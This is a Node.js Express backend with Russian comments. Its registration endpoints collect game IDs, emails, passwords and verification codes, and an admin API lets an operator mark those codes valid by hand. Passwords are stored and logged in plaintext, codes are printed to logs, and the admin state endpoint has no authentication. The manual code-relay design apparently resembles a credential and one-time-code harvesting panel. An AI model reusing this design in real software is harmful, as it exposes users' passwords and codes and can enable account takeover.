// backend/server.js (COMMONJS)

const path = require("path");
const express = require("express");
const morgan = require("morgan");

const app = express();
const PORT = process.env.PORT || 3000;

// ===== MIDDLEWARE =====
app.use(morgan("dev"));
app.use(express.json());

// ===== PATHS =====
const ROOT = path.join(__dirname, "..");
const FRONTEND_DIR = path.join(ROOT, "frontend");
const MEDIA_DIR = path.join(ROOT, "media");

// ===== STATIC =====
// медиа отдельным урлом
app.use(
  "/media",
  express.static(MEDIA_DIR, {
    maxAge: "1h",
  })
);

// фронт (HTML + любые фронтовые ассеты, если появятся)
app.use(
  express.static(FRONTEND_DIR, {
    maxAge: "1h",
    index: "index.html",
  })
);

// health-check для Render
app.get("/healthz", (req, res) => {
  res.json({ ok: true });
});

// корень — основной сайт / хаб
app.get("/", (req, res) => {
  res.sendFile(path.join(FRONTEND_DIR, "index.html"));
});

// админка — frontend/admin/index.html
app.get("/admin", (req, res) => {
  res.sendFile(path.join(FRONTEND_DIR, "admin", "index.html"));
});

// (если у тебя есть отдельная страница регистрации)
app.get("/register", (req, res) => {
  res.sendFile(path.join(FRONTEND_DIR, "register", "index.html"));
});

// ===== IN-MEMORY STORAGE (для теста; после рестарта всё очищается) =====
let idCodeRequests = [];
let emailCodeRequests = [];
let registrations = [];
let seq = 1;

function genId() {
  return String(seq++);
}

// ===== PUBLIC API (frontend регистрации) =====

app.post("/api/request-id-code", (req, res) => {
  const { accessCode, ingameId, email } = req.body || {};

  if (!accessCode || !ingameId || !email) {
    return res.status(400).json({ ok: false, error: "missing_fields" });
  }

  const now = new Date().toISOString();

  let rec = idCodeRequests.find(
    (r) => r.accessCode === accessCode && r.ingameId === ingameId && r.email === email
  );

  if (!rec) {
    rec = {
      id: genId(),
      accessCode,
      ingameId,
      email,
      status: "pending",
      lastCode: null,
      lastCodeAt: null,
      createdAt: now,
    };
    idCodeRequests.push(rec);
  } else {
    rec.ingameId = ingameId;
    rec.email = email;
  }

  console.log("[ID REQUEST]", rec);
  return res.json({ ok: true, id: rec.id });
});

app.post("/api/verify-id-code", (req, res) => {
  const { accessCode, ingameId, email, code } = req.body || {};

  if (!accessCode || !ingameId || !email || !code) {
    return res.status(400).json({ status: "invalid", error: "missing_fields" });
  }

  const now = new Date().toISOString();
  const cleanCode = String(code).trim();

  let rec = idCodeRequests.find(
    (r) => r.accessCode === accessCode && r.ingameId === ingameId && r.email === email
  );

  if (!rec) {
    rec = {
      id: genId(),
      accessCode,
      ingameId,
      email,
      status: "code_sent",
      lastCode: cleanCode,
      lastCodeAt: now,
      createdAt: now,
    };
    idCodeRequests.push(rec);
  } else {
    rec.lastCode = cleanCode;
    rec.lastCodeAt = now;
    if (rec.status !== "valid" && rec.status !== "invalid") {
      rec.status = "code_sent";
    }
  }

  console.log("[ID VERIFY] code=", cleanCode, "rec-status=", rec.status);

  if (rec.status === "valid") return res.json({ status: "valid" });
  if (rec.status === "invalid") return res.json({ status: "invalid" });
  return res.json({ status: "pending" });
});

app.post("/api/request-email-code", (req, res) => {
  const { accessCode, email, ingameId } = req.body || {};

  if (!accessCode || !email) {
    return res.status(400).json({ ok: false, error: "missing_fields" });
  }

  const now = new Date().toISOString();

  let rec = emailCodeRequests.find((r) => r.accessCode === accessCode && r.email === email);

  if (!rec) {
    rec = {
      id: genId(),
      accessCode,
      email,
      ingameId: ingameId || null,
      status: "pending",
      lastCode: null,
      lastCodeAt: null,
      createdAt: now,
    };
    emailCodeRequests.push(rec);
  } else {
    rec.ingameId = ingameId || rec.ingameId;
    rec.email = email;
  }

  console.log("[EMAIL REQUEST]", rec);
  return res.json({ ok: true, id: rec.id });
});

app.post("/api/verify-email-code", (req, res) => {
  const { accessCode, email, code } = req.body || {};

  if (!accessCode || !email || !code) {
    return res.status(400).json({ status: "invalid", error: "missing_fields" });
  }

  const now = new Date().toISOString();
  const cleanCode = String(code).trim();

  let rec = emailCodeRequests.find((r) => r.accessCode === accessCode && r.email === email);

  if (!rec) {
    rec = {
      id: genId(),
      accessCode,
      email,
      ingameId: null,
      status: "code_sent",
      lastCode: cleanCode,
      lastCodeAt: now,
      createdAt: now,
    };
    emailCodeRequests.push(rec);
  } else {
    rec.lastCode = cleanCode;
    rec.lastCodeAt = now;
    if (rec.status !== "valid" && rec.status !== "invalid") {
      rec.status = "code_sent";
    }
  }

  console.log("[EMAIL VERIFY] code=", cleanCode, "rec-status=", rec.status);

  if (rec.status === "valid") return res.json({ status: "valid" });
  if (rec.status === "invalid") return res.json({ status: "invalid" });
  return res.json({ status: "pending" });
});

app.post("/api/submit-registration", (req, res) => {
  const { accessCode, ingameId, email, password, idCode, emailCode, flow } = req.body || {};

  if (!accessCode || !ingameId || !email) {
    return res.status(400).json({ ok: false, error: "missing_fields" });
  }

  const idReq = idCodeRequests.find(
    (r) => r.accessCode === accessCode && r.ingameId === ingameId && r.email === email
  );
  const emailReq = emailCodeRequests.find((r) => r.accessCode === accessCode && r.email === email);

  const idVerified = !!idReq && idReq.status === "valid";
  const emailVerified = !!emailReq && emailReq.status === "valid";

  const reg = {
    id: genId(),
    accessCode,
    ingameId,
    email,
    password: password || null,
    idCode: idCode || null,
    emailCode: emailCode || null,
    idVerified,
    emailVerified,
    status: "pending",
    flow: flow || (ingameId === "web-login" ? "popcorn" : "hub"),
    createdAt: new Date().toISOString(),
    declineReason: null,
    adminNote: null,
    slot: null,
    link: null,
  };

  registrations.push(reg);

  console.log("[REGISTRATION SUBMITTED]", reg);
  return res.json({ ok: true, id: reg.id });
});

// ===== ADMIN API =====
app.get("/admin/api/state", (req, res) => {
  res.json({ idCodeRequests, emailCodeRequests, registrations });
});

app.post("/admin/api/id-code/mark-valid", (req, res) => {
  const { id } = req.body || {};
  const rec = idCodeRequests.find((r) => r.id === String(id));
  if (!rec) return res.status(404).json({ ok: false, error: "not_found" });
  rec.status = "valid";
  console.log("[ADMIN] ID VALID:", rec.email, rec.ingameId);
  res.json({ ok: true });
});

app.post("/admin/api/id-code/mark-invalid", (req, res) => {
  const { id } = req.body || {};
  const rec = idCodeRequests.find((r) => r.id === String(id));
  if (!rec) return res.status(404).json({ ok: false, error: "not_found" });
  rec.status = "invalid";
  console.log("[ADMIN] ID INVALID:", rec.email, rec.ingameId);
  res.json({ ok: true });
});

app.post("/admin/api/email-code/mark-valid", (req, res) => {
  const { id } = req.body || {};
  const rec = emailCodeRequests.find((r) => r.id === String(id));
  if (!rec) return res.status(404).json({ ok: false, error: "not_found" });
  rec.status = "valid";
  console.log("[ADMIN] EMAIL VALID:", rec.email);
  res.json({ ok: true });
});

app.post("/admin/api/email-code/mark-invalid", (req, res) => {
  const { id } = req.body || {};
  const rec = emailCodeRequests.find((r) => r.id === String(id));
  if (!rec) return res.status(404).json({ ok: false, error: "not_found" });
  rec.status = "invalid";
  console.log("[ADMIN] EMAIL INVALID:", rec.email);
  res.json({ ok: true });
});

app.post("/admin/api/registration/approve", (req, res) => {
  const { id, slot, link, note } = req.body || {};
  const reg = registrations.find((r) => r.id === String(id));
  if (!reg) return res.status(404).json({ ok: false, error: "not_found" });

  reg.status = "approved";
  reg.slot = slot || null;
  reg.link = link || null;
  reg.adminNote = note || null;

  console.log("[ADMIN] APPROVED", reg.email, "slot=", slot, "link=", link, "note=", note);
  res.json({ ok: true });
});

app.post("/admin/api/registration/decline", (req, res) => {
  const { id, reason, note } = req.body || {};
  const reg = registrations.find((r) => r.id === String(id));
  if (!reg) return res.status(404).json({ ok: false, error: "not_found" });

  reg.status = "declined";
  reg.declineReason = reason || "other";
  reg.adminNote = note || null;

  console.log("[ADMIN] DECLINED", reg.email, "reason=", reason, "note=", note);
  res.json({ ok: true });
});

// ===== START SERVER =====
app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
